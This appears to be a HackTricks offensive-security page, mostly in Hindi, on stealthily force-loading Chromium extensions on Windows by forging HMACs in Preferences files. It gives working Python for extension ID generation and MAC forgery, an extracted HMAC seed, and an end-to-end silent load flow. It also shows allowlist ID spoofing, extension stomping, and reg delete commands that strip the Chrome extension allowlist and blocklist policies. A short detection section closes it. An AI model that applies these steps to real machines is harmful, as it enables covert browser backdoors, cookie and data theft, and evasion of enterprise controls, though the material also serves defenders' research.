# Forced Extension Load & Preferences MAC Forgery (Windows)

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

Stealthy post-exploitation तकनीक जिससे Windows पर Chromium-based ब्राउज़रों में arbitrary extensions को force-load किया जा सकता है, एक उपयोगकर्ता की Preferences/Secure Preferences को संपादित कर और संशोधित nodes के लिए मान्य HMACs बनाकर। यह Chrome/Chromium, Edge, और Brave के खिलाफ काम करता है। प्रकाशन के समय यह Chromium 130 से 139 तक लागू देखा गया था। विक्टिम प्रोफ़ाइल में एक साधारण disk write primitive पर्याप्त है ताकि बिना command-line flags या user prompts के एक full-privileged extension को स्थायी बनाया जा सके।

> मुख्य विचार: Chromium per-user extension state को एक JSON preferences फ़ाइल में स्टोर करता है और इसे HMAC-SHA256 से सुरक्षित करता है। यदि आप ब्राउज़र के embedded seed के साथ मान्य MACs गणना कर के उन्हें अपने injected nodes के बगल में लिखते हैं, तो ब्राउज़र आपके extension entry को स्वीकार और सक्रिय कर देता है।


## जहाँ extension state रहता है (Windows)

- Non–domain‑joined Chrome प्रोफ़ाइल:
- %USERPROFILE%/AppData/Local/Google/Chrome/User Data/Default/Secure Preferences (एक root "super_mac" शामिल है).
- Domain‑joined Chrome प्रोफ़ाइल:
- %USERPROFILE%/AppData/Local/Google/Chrome/User Data/Default/Preferences
- Chromium द्वारा उपयोग किए जाने वाले मुख्य nodes:
- extensions.settings.<extension_id> → extension entry के लिए embedded manifest/metadata
- protection.macs.extensions.settings.<extension_id> → उस JSON blob के लिए HMAC
- Chromium ≥134: extensions.ui.developer_mode (boolean) मौजूद होना चाहिए और unpacked extensions के सक्रिय होने के लिए MAC‑signed होना चाहिए

सरलीकृत स्कीमा (उदाहरण):
```json
{
"extensions": {
"settings": {
"<extension_id>": {
"name": "Extension name",
"manifest_version": 3,
"version": "1.0",
"key": "<BASE64 DER SPKI>",
"path": "<absolute path if unpacked>",
"state": 1,
"from_bookmark": false,
"was_installed_by_default": false
// ...rest of manifest.json + required install metadata
}
},
"ui": { "developer_mode": true }
},
"protection": {
"macs": {
"extensions": {
"settings": { "<extension_id>": "<MAC>" },
"ui": { "developer_mode": "<MAC>" }
}
}
}
}
```
नोट:
- Edge/Brave समान संरचनाएँ बनाए रखते हैं। protection seed value अलग हो सकती है (कुछ बिल्ड्स में Edge/Brave ने null/other seed का उपयोग करते हुए देखा गया)।

## Extension IDs: path vs key and making them deterministic

Chromium निम्नानुसार extension ID निकलता है:
- Packed/signed extension: ID = SHA‑256 over DER‑encoded SubjectPublicKeyInfo (SPKI) → take first 32 hex chars → map 0–f to a–p
- Unpacked (no key in manifest): ID = SHA‑256 over the absolute installation path bytes → map 0–f to a–p

hosts पर एक स्थिर ID बनाए रखने के लिए, manifest.json में "key" के अंतर्गत एक fixed base64 DER public key एम्बेड करें। ID installation path के बजाय इस key से निकाला जाएगा।

Helper to generate a deterministic ID and a key pair:
```python
import base64
import hashlib
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

def translate_crx_id(s: str) -> str:
t = {'0':'a','1':'b','2':'c','3':'d','4':'e','5':'f','6':'g','7':'h','8':'i','9':'j','a':'k','b':'l','c':'m','d':'n','e':'o','f':'p'}
return ''.join(t.get(c, c) for c in s)

def generate_extension_keys() -> tuple[str,str,str]:
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = priv.public_key()
spki = pub.public_bytes(encoding=serialization.Encoding.DER,
format=serialization.PublicFormat.SubjectPublicKeyInfo)
crx_id = translate_crx_id(hashlib.sha256(spki).digest()[:16].hex())
pub_b64 = base64.b64encode(spki).decode('utf-8')
priv_der = priv.private_bytes(encoding=serialization.Encoding.DER,
format=serialization.PrivateFormat.TraditionalOpenSSL,
encryption_algorithm=serialization.NoEncryption())
priv_b64 = base64.b64encode(priv_der).decode('utf-8')
return crx_id, pub_b64, priv_b64

print(generate_extension_keys())
```
अपने manifest.json में जनरेट किया गया public key जोड़ें ताकि ID लॉक हो:
```json
{
"manifest_version": 3,
"name": "Synacktiv extension",
"version": "1.0",
"key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2lMCg6..."
}
```
## Preferences की integrity MACs का फोर्ज़ करना (core bypass)

Chromium प्रत्येक नोड के "path" + serialized JSON value पर HMAC‑SHA256 के साथ preferences की सुरक्षा करता है। HMAC seed ब्राउज़र के resources.pak में embedded है और Chromium 139 तक वैध था।

GRIT pak_util से seed निकालें और seed container (परीक्षित बिल्ड्स में file id 146) ढूँढें:
```bash
python3 pak_util.py extract resources.pak -o resources_v139/
python3 pak_util.py extract resources.pak -o resources_v139_dirty/
# compare a clean vs minimally modified resources.pak to spot the seed holder
xxd -p resources_v139/146
# e748f336d85ea5f9dcdf25d8f347a65b4cdf667600f02df6724a2af18a212d26b788a25086910cf3a90313696871f3dc05823730c91df8ba5c4fd9c884b505a8
```
MACs (uppercase hex) को इस प्रकार गणना करें:
```text
ext_mac = HMAC_SHA256(seed,
"extensions.settings.<crx_id>" + json.dumps(<settings_json>))

devmode_mac = HMAC_SHA256(seed,
"extensions.ui.developer_mode" + ("true" or "false"))
```
न्यूनतम Python उदाहरण:
```python
import json, hmac, hashlib

def mac_upper(seed_hex: str, pref_path: str, value) -> str:
seed = bytes.fromhex(seed_hex)
# Compact JSON to match Chromium serialization closely
val = json.dumps(value, separators=(',', ':')) if not isinstance(value, str) else value
msg = (pref_path + val).encode('utf-8')
return hmac.new(seed, msg, hashlib.sha256).hexdigest().upper()

# Example usage
settings_path = f"extensions.settings.{crx_id}"
devmode_path = "extensions.ui.developer_mode"
ext_mac = mac_upper(seed_hex, settings_path, settings_json)
devmode_mac = mac_upper(seed_hex, devmode_path, "true")
```
Write the values under:
- protection.macs.extensions.settings.<crx_id> = ext_mac
- protection.macs.extensions.ui.developer_mode = devmode_mac (Chromium ≥134)

ब्राउज़र में अंतर: Microsoft Edge और Brave पर seed null/अलग हो सकता है। HMAC संरचना समान रहती है; seed के अनुसार समायोजित करें।

> कार्यान्वयन टिप्स
> - MACs की गणना करते समय Chromium जो JSON serialization उपयोग करता है वही बिल्कुल उपयोग करें (compact JSON बिना whitespace व्यवहार में सुरक्षित है; ordering समस्याओं से बचने के लिए keys को sort करना मददगार हो सकता है)।
> - सुनिश्चित करें extensions.ui.developer_mode मौजूद है और Chromium ≥134 पर signed है, वरना आपका unpacked entry सक्रिय नहीं होगा।


## एंड‑टू‑एंड साइलेंट लोड फ्लो (Windows)

1) एक deterministic ID जनरेट करें और manifest.json में "key" एम्बेड करें; इच्छित permissions के साथ एक unpacked MV3 extension तैयार करें (service worker/content scripts)  
2) manifest और Chromium के लिए आवश्यक न्यूनतम install metadata (state, unpacked का path, आदि) को एम्बेड करके extensions.settings.<id> बनाएं।  
3) resources.pak (file 146) से HMAC seed निकालें और दो MACs compute करें: एक settings node के लिए और एक extensions.ui.developer_mode के लिए (Chromium ≥134)  
4) तैयार किए गए nodes और MACs को target profile की Preferences/Secure Preferences में लिखें; अगली बार launch पर आपका extension पूर्ण घोषित privileges के साथ auto‑activate हो जाएगा।


## Bypassing enterprise controls

- Whitelisted extension hash spoofing (ID spoofing)
1) एक allowed Web Store extension install करें और उसकी ID नोट करें  
2) उसका public key प्राप्त करें (उदाहरण के लिए chrome.runtime.getManifest().key से background/service worker में या उसकी .crx को fetch/parse करके)  
3) उसी key को अपने modified extension में manifest.key के रूप में सेट करें ताकि वही ID पुन: उत्पन्न हो  
4) Preferences में entry register करें और MACs को sign करें → ExtensionInstallAllowlist जो केवल ID पर match करता है, उसे बाइपास किया जा सकता है

- Extension stomping (ID collision precedence)
- यदि किसी local unpacked extension का ID किसी installed Web Store extension के साथ मिलता है, तो Chromium unpacked one को प्राथमिकता देता है। यह प्रभावी रूप से chrome://extensions में वैध extension को प्रतिस्थापित कर देता है जबकि trusted ID को संरक्षित रखता है। Chrome और Edge पर सत्यापित (उदा., Adobe PDF)

- Neutralizing GPO via HKCU (requires admin)
- Chrome/Edge policies HKCU\Software\Policies\* के अंतर्गत रहती हैं  
- Admin अधिकारों के साथ, अपने entries लिखने से पहले policy keys को delete/modify करें ताकि blocks से बचा जा सके:
```powershell
reg delete "HKCU\Software\Policies\Google\Chrome\ExtensionInstallAllowlist" /f
reg delete "HKCU\Software\Policies\Google\Chrome\ExtensionInstallBlocklist" /f
```
## शोर-भरा फॉलबैक: कमांड-लाइन लोडिंग

Chromium ≥137 से, --load-extension के साथ निम्न भी पास करना आवश्यक है:
```text
--disable-features=DisableLoadExtensionCommandLineSwitch
```
यह तरीका व्यापक रूप से जाना और मॉनिटर किया जाता है (e.g., by EDR/DFIR; used by commodity malware like Chromeloader). Preference MAC forging is stealthier.

Related flags and more cross‑platform tricks are discussed here:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}


## ऑपरेशनल प्रभाव

एक बार स्वीकार होने पर, extension अपने घोषित permissions के साथ चलता है, जिससे DOM access, request interception/redirects, cookie/storage access, और screenshot capture सक्षम होते हैं — प्रभावी रूप से in‑browser code execution और durable user‑profile persistence। Remote deployment SMB या अन्य चैनलों पर सीधा है क्योंकि activation Preferences के माध्यम से data‑driven होता है।


## पहचान और hardening

- Preferences/Secure Preferences में लिख रहे non‑Chromium processes के लिए मॉनिटर करें, विशेषकर extensions.settings के नीचे नए nodes जो protection.macs entries के साथ जोड़े गए हों
- extensions.ui.developer_mode के अनपेक्षित toggling पर और HMAC‑valid लेकिन अप्रूव्ड न किए गए extension entries पर alert करें
- HKCU/HKLM Software\Policies में किसी भी tampering के लिए audit करें; policies को device management/Chrome Browser Cloud Management के माध्यम से लागू करें
- store से verified publishers वाले forced‑install को तरजीह दें बजाय उन allowlists के जो केवल extension ID से मेल खाते हैं


## संदर्भ

- [The Phantom Extension: Backdooring chrome through uncharted pathways](https://www.synacktiv.com/en/publications/the-phantom-extension-backdooring-chrome-through-uncharted-pathways.html)
- [pak_util.py (GRIT)](https://chromium.googlesource.com/chromium/src/+/master/tools/grit/pak_util.py)
- [SecurePreferencesFile (prior research on HMAC seed)](https://github.com/Pica4x6/SecurePreferencesFile)
- [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)

{{#include ../../banners/hacktricks-training.md}}
